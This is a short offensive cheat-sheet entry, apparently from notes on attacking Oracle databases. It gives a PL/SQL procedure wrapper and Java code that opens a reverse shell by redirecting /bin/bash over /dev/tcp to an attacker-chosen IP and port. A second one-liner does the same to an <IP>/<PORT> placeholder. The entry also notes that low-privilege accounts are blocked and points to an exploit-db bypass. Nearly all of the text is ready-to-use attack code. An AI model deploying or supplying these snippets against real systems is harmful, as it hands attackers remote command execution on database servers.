# Reverse Shell

This approach will not work as the Oracle JVM implements fine grain policy-based security to control access to the OS and filesystem.  Executing this procedure from a low-permissioned account results in errors. (some old database bypasses are [available](https://www.exploit-db.com/exploits/33601/) however). Create or replace procedure reverse_shell `(p_ip IN VARCHAR2, p_port IN VARCHAR2)` IS language java name `'ReverseShell.getConnection(java.lang.String, java.lang.String)';`.
 
```java
import java.io.*;

public class ReverseShell {
 public static void getConnection(String ip, String port) throws InterruptedException, IOException {
   Runtime r = Runtime.getRuntime();
   Process p = r.exec(new String[]{"/bin/bash","-c","0<&126-;exec 126<>/dev/tcp/" + ip + "/" + port + ";/bin/bash <&126 >&126 2>&126"});
   System.out.println(p.toString());
   p.waitFor();
 }
}
```

One-liner.

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```